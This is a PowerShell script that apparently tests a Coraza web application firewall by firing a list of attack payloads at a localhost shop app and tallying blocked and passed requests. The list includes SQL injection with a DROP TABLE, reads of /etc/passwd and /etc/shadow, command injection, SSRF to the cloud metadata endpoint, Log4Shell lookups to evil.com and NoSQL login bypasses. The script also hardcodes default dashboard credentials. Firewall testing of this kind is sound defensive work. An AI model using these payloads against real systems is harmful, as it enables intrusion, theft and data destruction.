param(
    [int]$LoopDelay = 5,
    [int]$RunCount = 0
)

$target = "http://localhost:8080"

$attacks = @(
    @{ Name = "SQLi: OR 1=1"; URI = "/rest/products/search?q=' OR 1=1--" },
    @{ Name = "SQLi: UNION SELECT"; URI = "/rest/products/search?q=' UNION SELECT username,password FROM users--" },
    @{ Name = "SQLi: Blind Boolean"; URI = "/rest/products/search?q=' AND 1=1 AND 'a'='a" },
    @{ Name = "SQLi: Login Bypass Params"; URI = "/rest/user/login?email=' OR 1=1--" },
    @{ Name = "SQLi: Time-based Blind"; URI = "/rest/products/search?q=' OR SLEEP(5)--" },
    @{ Name = "SQLi: Stacked Queries"; URI = "/rest/products/search?q='; DROP TABLE users;--" },
    @{ Name = "SQLi: BENCHMARK"; URI = "/rest/products/search?q=' OR BENCHMARK(1000000,SHA1('test'))--" },
    @{ Name = "XSS: Script Tag"; URI = "/rest/products/search?q=<script>alert(1)</script>" },
    @{ Name = "XSS: IMG onerror"; URI = "/rest/products/search?q=<img src=x onerror=alert(1)>" },
    @{ Name = "XSS: SVG onload"; URI = "/rest/products/search?q=<svg/onload=alert('XSS')>" },
    @{ Name = "XSS: Event Handler"; URI = "/rest/products/search?q=<body onload=alert(1)>" },
    @{ Name = "XSS: javascript: URI"; URI = "/rest/products/search?q=<a href=javascript:alert(1)>click</a>" },
    @{ Name = "XSS: Base64 Encoded"; URI = "/rest/products/search?q=<img src=`javascript:alert(1)`>" },
    @{ Name = "LFI: File param traversal"; URI = "/rest/products/search?q=../../../../etc/passwd" },
    @{ Name = "LFI: /etc/passwd path"; URI = "/ftp/../../../../etc/passwd" },
    @{ Name = "LFI: /etc/shadow path"; URI = "/ftp/../../../etc/shadow" },
    @{ Name = "LFI: Windows hosts path"; URI = "/ftp/..\..\..\..\windows\system32\drivers\etc\hosts" },
    @{ Name = "LFI: Null byte URI"; URI = "/ftp/../../../../etc/passwd%00.jpg" },
    @{ Name = "LFI: Double encoding URI"; URI = "/ftp/%252e%252e%252f%252e%252e%252fetc/passwd" },
    @{ Name = "CMDi: whoami"; URI = "/rest/products/search?q=|whoami" },
    @{ Name = "CMDi: cat /etc/passwd"; URI = "/rest/products/search?q=;cat /etc/passwd" },
    @{ Name = "CMDi: Backtick"; URI = "/rest/products/search?q=``id``" },
    @{ Name = "CMDi: Dollar Subshell"; URI = '/rest/products/search?q=$(cat /etc/passwd)' },
    @{ Name = "CMDi: Pipe chain"; URI = "/rest/products/search?q=|ls -la /etc/" },
    @{ Name = "RCE: PHP System"; URI = "/rest/products/search?q=<?php system('id'); ?>" },
    @{ Name = "SSRF: localhost probe"; URI = "/rest/products/search?q=http://127.0.0.1:22" },
    @{ Name = "SSRF: metadata endpoint"; URI = "/rest/products/search?q=http://169.254.169.254/latest/meta-data/" },
    @{ Name = "Log4Shell: Params JNDI"; URI = '/rest/products/search?q=${jndi:ldap://evil.com/a}' },
    @{ Name = "Log4Shell: UserAgent JNDI"; URI = "/"; Headers = @{ "User-Agent" = '${jndi:ldap://evil.com/a}' } },
    @{ Name = "Log4Shell: JNDI RMI"; URI = '/rest/products/search?q=${jndi:rmi://evil.com/a}' },
    @{ Name = "Protocol: CRLF Injection"; URI = "/rest/products/search?q=%0d%0aInjected-Header:true" },
    @{ Name = "Protocol: HTTP Splitting"; URI = "/rest/products/search?q=%0d%0aHTTP/1.1%20200%20OK" },
    @{ Name = "Scanner: Nikto UA"; URI = "/"; Headers = @{ "User-Agent" = "Nikto/2.1.5" } },
    @{ Name = "Scanner: SQLMap UA"; URI = "/"; Headers = @{ "User-Agent" = "sqlmap/1.5" } },
    @{ Name = "Scanner: DirBuster UA"; URI = "/"; Headers = @{ "User-Agent" = "DirBuster-1.0-RC1" } },
    @{ Name = "XXE: External Entity"; URI = "/api/Products"; Body = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'; Method = "POST"; ContentType = "application/xml" },
    @{ Name = "NoSQLi: Admin Login Bypass"; URI = "/rest/user/login"; Body = '{"email": {"$gt": ""}, "password": "any"}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "NoSQLi: Tracking Order Exfiltrate"; URI = "/rest/track-order/1' OR '1'=='1"; Method = "GET" },
    @{ Name = "NoSQLi: Order Exfiltration where"; URI = "/rest/track-order/1"; Method = "GET" },
    @{ Name = "SSTI: Simple Expression"; URI = "/rest/user/reset-password?email={{7*7}}"; Method = "GET" },
    @{ Name = "SSTI: Variable Grab"; URI = '/rest/user/reset-password?email=${7*7}'; Method = "GET" },
    @{ Name = "SSTI: Object Exploration"; URI = "/rest/user/reset-password?email={{request}}"; Method = "GET" },
    @{ Name = "ProtoPollution: __proto__"; URI = "/api/Users"; Body = '{"__proto__": {"admin": true}}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "ProtoPollution: constructor.prototype"; URI = "/api/Users"; Body = '{"constructor": {"prototype": {"admin": true}}}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "B2B: SQLi in CID"; URI = "/b2b/v2/orders"; Body = '{"cid": "JS0815DE OR 1=1--", "orderLines": []}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "B2B: XSS in CID"; URI = "/b2b/v2/orders"; Body = '{"cid": "<script>alert(1)</script>", "orderLines": []}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "XSS: iframe javascript"; URI = "/api/Feedbacks"; Body = '{"comment": "<iframe src=javascript:alert(1)>", "rating": 5}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "Layer2: SQLi Obfuscated hex"; URI = "/rest/products/search?q=0x2720554e494f4e2053454c454354202a2066726f6d207573657273--"; Method = "GET" },
    @{ Name = "Layer2: SQLi char encoding"; URI = "/rest/products/search?q=%27%20%4f%52%20%31%3d%31--"; Method = "GET" },
    @{ Name = "Layer2: XSS eventless"; URI = "/rest/products/search?q=<img src=x onerror>=alert(1)>"; Method = "GET" },
    @{ Name = "Layer2: SQLicomment inline"; URI = "/rest/products/search?q=admin'--"; Method = "GET" },
    @{ Name = "Layer2: NoSQLi array extend"; URI = "/rest/user/login"; Body = '{"email": [{"$ne": ""}], "password": "test"}'; Method = "POST"; ContentType = "application/json" },
    @{ Name = "Layer2: encoded path"; URI = "/rest/products/search?q=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"; Method = "GET" },
    @{ Name = "Layer2: double urlencode"; URI = "/rest/products/search?q=%252e%252e%252fetc%252fpasswd"; Method = "GET" },
    @{ Name = "Layer2: SQLi case variant"; URI = "/rest/products/search?q=' uNiOn SeLeAlL * FrOm uSeRs--"; Method = "GET" },
    @{ Name = "Layer2: XSS unicode escape"; URI = "/rest/products/search?q=<script>alert(/xss/)</script>"; Method = "GET" }
)

function Invoke-Attack {
    param($atk)

    $name = $atk.Name
    $fullUri = $target + $atk.URI

    try {
        $webParams = @{
            Uri = $fullUri
            UseBasicParsing = $true
            ErrorAction = "Stop"
            TimeoutSec = 5
        }

        if ($atk.Method) {
            $webParams.Method = $atk.Method
        } else {
            $webParams.Method = "GET"
        }

        if ($atk.Headers) {
            $webParams.Headers = $atk.Headers
        }

        if ($atk.Body) {
            $webParams.Body = $atk.Body
            $webParams.ContentType = $atk.ContentType
        }

        $resp = Invoke-WebRequest @webParams
        $statusCode = $resp.StatusCode
    }
    catch {
        $statusCode = [int]$_.Exception.Response.StatusCode
        if ($statusCode -eq 0) { $statusCode = "ERR" }
    }

    if ($statusCode -eq 403 -or $statusCode -eq 400 -or $statusCode -eq "ERR") {
        Write-Host "  [BLOCKED] " -ForegroundColor Red -NoNewline
        Write-Host "$statusCode  $name" -ForegroundColor DarkGray
        return "blocked"
    }
    else {
        Write-Host "  [PASSED]  " -ForegroundColor Yellow -NoNewline
        Write-Host "$statusCode  $name" -ForegroundColor DarkGray
        return "passed"
    }
}

$iteration = 0
$totalBlocked = 0
$totalPassed = 0

Write-Host ""
Write-Host "  CORAZA WAF ATTACK SUITE" -ForegroundColor Cyan
Write-Host "  Target: $target" -ForegroundColor DarkGray
Write-Host "  Payloads: $($attacks.Count)" -ForegroundColor DarkGray
Write-Host "  Loop Delay: ${LoopDelay}s" -ForegroundColor DarkGray
if ($RunCount -gt 0) {
    Write-Host "  Run Count: $RunCount" -ForegroundColor DarkGray
} else {
    Write-Host "  Run Count: Infinite (Ctrl+C to stop)" -ForegroundColor DarkGray
}
Write-Host "  ------------------------------" -ForegroundColor DarkGray
Write-Host ""

do {
    $iteration++
    $blocked = 0
    $passed = 0

    Write-Host "  [ITERATION $iteration]" -ForegroundColor Cyan

    foreach ($atk in $attacks) {
        $result = Invoke-Attack $atk
        if ($result -eq "blocked") { $blocked++ } else { $passed++ }
        Start-Sleep -Milliseconds 100
    }

    $totalBlocked += $blocked
    $totalPassed += $passed

    Write-Host ""
    Write-Host "  Iteration Blocked: $blocked / $($attacks.Count)" -ForegroundColor Red
    Write-Host "  Iteration Passed:  $passed / $($attacks.Count)" -ForegroundColor Yellow
    Write-Host "  Total Blocked:     $totalBlocked" -ForegroundColor Red
    Write-Host "  Total Passed:      $totalPassed" -ForegroundColor Yellow
    Write-Host ""

    if ($RunCount -eq 0 -or $iteration -lt $RunCount) {
        Write-Host "  Next iteration in ${LoopDelay}s... (Ctrl+C to stop)" -ForegroundColor DarkGray
        Write-Host "  ------------------------------" -ForegroundColor DarkGray
        Write-Host ""
        Start-Sleep -Seconds $LoopDelay
    }

} while ($RunCount -eq 0 -or $iteration -lt $RunCount)

function Get-DashboardStats {
    try {
        $loginBody = @{ email = "admin@modintel.local"; password = "ChangeMe123!" } | ConvertTo-Json
        $loginResp = Invoke-RestMethod -Uri "http://localhost:3000/api/v1/auth/login" -Method POST -Body $loginBody -ContentType "application/json" -UseBasicParsing
        $token = $loginResp.data.access_token

        $stats = Invoke-RestMethod -Uri "http://localhost:8082/api/stats" -Headers @{ Authorization = "Bearer $token" } -UseBasicParsing
        return $stats
    }
    catch {
        return $null
    }
}

Write-Host ""
Write-Host "  ========== FINAL SUMMARY ==========" -ForegroundColor Cyan
Write-Host "  Total Iterations: $iteration" -ForegroundColor DarkGray
Write-Host "  Total Blocked:    $totalBlocked" -ForegroundColor Red
Write-Host "  Total Passed:     $totalPassed" -ForegroundColor Yellow
Write-Host "  Malicious reqs:   $($attacks.Count * $iteration)" -ForegroundColor DarkGray
Write-Host ""

$dashStats = Get-DashboardStats
if ($dashStats) {
    Write-Host "  ========== DASHBOARD SYNC =========" -ForegroundColor Cyan
    Write-Host "  Total alerts:     $($dashStats.total_alerts)" -ForegroundColor DarkGray
    Write-Host "  WAF alerts:       $($dashStats.total_alerts - $dashStats.ml_miss_count)" -ForegroundColor Red
    Write-Host "  Miss detections:  $($dashStats.ml_miss_count)" -ForegroundColor Yellow
    Write-Host "  AI enriched:      $($dashStats.ai_enriched_count)" -ForegroundColor DarkGray
    Write-Host ""

    $expected = $attacks.Count * $iteration
    $actual = $dashStats.total_alerts
    if ($actual -eq $expected) {
        Write-Host "  MATCH: $actual / $expected alerts logged" -ForegroundColor Green
    }
    elseif ($actual -gt $expected) {
        Write-Host "  WARNING: $actual logged, expected $expected (possible false positives)" -ForegroundColor Yellow
    }
    else {
        $deduped = $expected - $actual
        Write-Host "  NOTE: $actual unique alerts from $expected requests ($deduped duplicates deduplicated)" -ForegroundColor Green
    }
}
else {
    Write-Host "  Dashboard stats unavailable (review-api may not be running)" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "  Attack suite completed." -ForegroundColor Green
